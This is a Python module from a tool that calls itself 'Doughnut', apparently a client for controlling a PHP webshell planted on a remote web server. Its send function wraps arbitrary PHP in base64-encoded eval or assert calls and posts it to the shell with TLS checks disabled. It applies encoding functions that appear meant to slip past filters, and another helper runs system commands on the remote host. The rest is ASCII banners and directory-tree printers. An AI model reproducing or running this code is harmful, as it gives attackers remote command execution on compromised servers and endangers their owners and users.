import json
import subprocess
from base64 import b64decode, b64encode
from os import popen
from platform import system
from random import randint, sample

import requests
from urllib3 import disable_warnings

from libs.config import color, gget

level = []
connect_pipe_map = {True: "│  ", False: "   "}
disable_warnings()


def banner():
    logo_choose = randint(1, 3)
    if logo_choose == 1:
        print(
            r"""
  _____                    _                 _
 |  __ \                  | |               | |
 | |  | | ___  _   _  __ _| |__  _ __  _   _| |_ ___
 | |  | |/ _ \| | | |/ _` | '_ \| '_ \| | | | __/ __|
 | |__| | (_) | |_| | (_| | | | | | | | |_| | |_\__ \
 |_____/ \___/ \__,_|\__, |_| |_|_| |_|\__,_|\__|___/
                      __/ |
                     |___/

 """
        )
    if logo_choose == 2:
        print(
            r"""
    ____                    __                __
   / __ \____  __  ______ _/ /_  ____  __  __/ /______
  / / / / __ \/ / / / __ `/ __ \/ __ \/ / / / __/ ___/
 / /_/ / /_/ / /_/ / /_/ / / / / / / / /_/ / /_(__  )
/_____/\____/\__,_/\__, /_/ /_/_/ /_/\__,_/\__/____/
                  /____/

"""
        )
    if logo_choose == 3:
        print(
            r"""
'########:::'#######::'##::::'##::'######:::'##::::'##:'##::: ##:'##::::'##:'########::'######::
 ##.... ##:'##.... ##: ##:::: ##:'##... ##:: ##:::: ##: ###:: ##: ##:::: ##:... ##..::'##... ##:
 ##:::: ##: ##:::: ##: ##:::: ##: ##:::..::: ##:::: ##: ####: ##: ##:::: ##:::: ##:::: ##:::..::
 ##:::: ##: ##:::: ##: ##:::: ##: ##::'####: #########: ## ## ##: ##:::: ##:::: ##::::. ######::
 ##:::: ##: ##:::: ##: ##:::: ##: ##::: ##:: ##.... ##: ##. ####: ##:::: ##:::: ##:::::..... ##:
 ##:::: ##: ##:::: ##: ##:::: ##: ##::: ##:: ##:::: ##: ##:. ###: ##:::: ##:::: ##::::'##::: ##:
 ########::. #######::. #######::. ######::: ##:::: ##: ##::. ##:. #######::::: ##::::. ######::
........::::.......::::.......::::......::::..:::::..::..::::..:::.......::::::..::::::......:::

"""
        )
    print(color.green("Doughnut Version: 2.0\n"))


def base64_encode(data: str):
    return b64encode(data.encode()).decode()


def base64_decode(data: str):
    return b64decode(data.encode()).decode()


def send(data: str, raw: bool = False, **extra_params):
    offset = 8

    def randstr(offset):
        return ''.join(sample("!@#$%^&*()[];,.?", offset))
    url = gget("url", "webshell")
    params_dict = gget("webshell.params_dict", "webshell")
    php_v7 = gget("webshell.v7", "webshell")
    password = gget("webshell.password", "webshell")
    raw_key = gget("webshell.method", "webshell")
    encode_functions = gget("webshell.encode_functions", "webshell")
    encode_pf = gget("encode.pf")
    params_dict.update(extra_params)
    if "data" not in params_dict:
        params_dict["data"] = {}
    head = randstr(offset)
    tail = randstr(offset)
    if not raw:
        data = f"""eval('error_reporting(0);print(\\'{head}\\');eval(base64_decode("{base64_encode(data)}"));print(\\'{tail}\\');');"""
        if (not php_v7):
            data = f"""assert(base64_decode("{base64_encode(data)}"));"""
    for func in encode_functions:
        if func in encode_pf:
            data = encode_pf[func].run(data)
    params_dict[raw_key][password] = data
    try:
        req = requests.post(url, verify=False, **params_dict)
    except requests.RequestException:
        print("Request Error")
        return
    req.encoding = req.apparent_encoding
    text = req.text
    content = req.content
    text_head_offset = text.find(head)
    text_tail_offset = text.find(tail)
    text_head_offset = text_head_offset + \
        offset if (text_head_offset != -1) else 0
    text_tail_offset = text_tail_offset if (
        text_tail_offset != -1) else len(text)
    con_head_offset = content.find(bytes(head, req.encoding))
    con_tail_offset = content.find(bytes(tail, req.encoding))
    con_head_offset = con_head_offset + \
        offset if (con_head_offset != -1) else 0
    con_tail_offset = con_tail_offset if (
        con_tail_offset != -1) else len(content)
    req.r_text = text[text_head_offset: text_tail_offset]
    req.r_content = content[con_head_offset: con_tail_offset]
    try:
        req.r_json = json.loads(req.r_text)
    except json.JSONDecodeError:
        req.r_json = ''
    if 0:  # DEBUG
        print(f"[debug] {params_dict}")
        print(f"[debug] [{req}] [len:{len(content)}] {text}")
    return req


def delay_send(time: float, data: str, raw: bool = False, **extra_params):
    from time import sleep
    sleep(time)
    send(data, raw, **extra_params)


def print_webshell_info():
    info = (
        gget("webshell.root", "webshell"),
        gget("webshell.os_version", "webshell"),
        gget("webshell.php_version", "webshell"),
    )
    info_name = ("Web root:", "OS version:", "PHP version:")
    for name, info in zip(info_name, info):
        print(name + "\n    " + info + "\n")


def is_windows(remote: bool = True):
    if (remote):
        return gget("webshell.iswin", "webshell")
    else:
        return True if 'win' in system().lower() else False


def has_env(env: str, remote: bool = True):
    if is_windows(remote):
        command = "where"
    else:
        command = "whereis"
    if (remote):
        flag = send(f"system('{command} {env}');").r_text
    else:
        flag = popen(f"{command} {env}").read()
    return len(flag)


def open_editor(file_path: str):
    editor = "notepad.exe" if has_env("notepad.exe", False) else "vi"
    try:
        p = subprocess.Popen([editor, file_path], shell=False)
        p.wait()
        return True
    except FileNotFoundError:
        return False


def _print_tree(tree_or_node, depth=0, is_file=False, end=False):
    if (is_file):
        pipe = "└─" if (end) else "├─"
        connect_pipe = "".join([connect_pipe_map[_] for _ in level[:depth-1]])
        try:
            tree_or_node = b64decode(tree_or_node.encode()).decode('gbk')
        except Exception:
            pass
        if ("/" in tree_or_node):
            tree_or_node = tree_or_node.split("/")[-1]
        print(connect_pipe + pipe + tree_or_node)
    elif (isinstance(tree_or_node, list)):
        index = 0
        for v in tree_or_node:
            index += 1
            if (index == len(tree_or_node)):
                end = True
            _print_tree(v, depth+1, is_file=True, end=end)  # 输出目录
    elif (isinstance(tree_or_node, dict)):
        index = 0
        level.append(True)
        for k, v in tree_or_node.items():
            index += 1
            if (index == len(tree_or_node)):
                end = True
            if (isinstance(v, (list, dict))):  # 树中树
                _print_tree(k, depth+1, is_file=True, end=end)  # 输出目录
                if (end):
                    level[depth] = False
                _print_tree(v, depth+1)  # 递归输出树x
            elif (isinstance(v, str)) or v is None:  # 节点
                _print_tree(v, depth+1, is_file=True, end=end)  # 输出文件


def print_tree(name, tree):
    global level
    level = []
    print(name)
    _print_tree(tree)


def old_print_tree(origin_path: str, tree: dict, depth: int = 0):
    if depth:
        if not origin_path.isdigit() and tree:
            origin_path = color.blue(origin_path)
            if depth == 1:
                print("├──" + origin_path)
            else:
                print("│" + "  │" * (depth - 1) + "  " + "├─" + origin_path)
        else:
            depth -= 1

    else:
        print(origin_path)
    if isinstance(tree, dict):
        for k, v in tree.items():
            print_tree(k, v, depth + 1)
    if isinstance(tree, str):
        tree = [tree]
    if isinstance(tree, list):
        if not depth:
            new_tree = ["├─" + file.split("/")[-1] for file in tree]
            print("\n".join(new_tree))
        else:
            new_tree = [
                "│" + "  │" * (depth - 1) + "  " + "├─" + file.split("/")[-1]
                for file in tree
            ]
            print("\n".join(new_tree))
